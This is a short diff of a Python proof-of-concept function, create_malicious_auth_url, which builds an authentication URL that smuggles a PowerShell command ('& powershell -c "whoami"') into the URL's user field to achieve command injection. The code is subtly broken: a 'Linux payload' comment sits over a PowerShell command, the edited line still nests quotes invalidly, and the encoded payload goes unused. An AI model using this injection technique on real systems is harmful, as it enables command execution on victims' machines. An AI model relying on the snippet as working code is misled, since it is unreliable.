@@ -25,7 +25,7 @@ def create_malicious_auth_url():
     # Linux payload
     payload = 'Start-Process powershell -ArgumentList "-NoExit", "-Command whoami"'
     encoded_payload = urllib.parse.quote(payload)
-    malicious_url = https://user:& powershell -c "whoami"
+    malicious_url = "https://user:& powershell -c "whoami""
     return malicious_url
 
 # JSON-RPC 2.0 helper functions
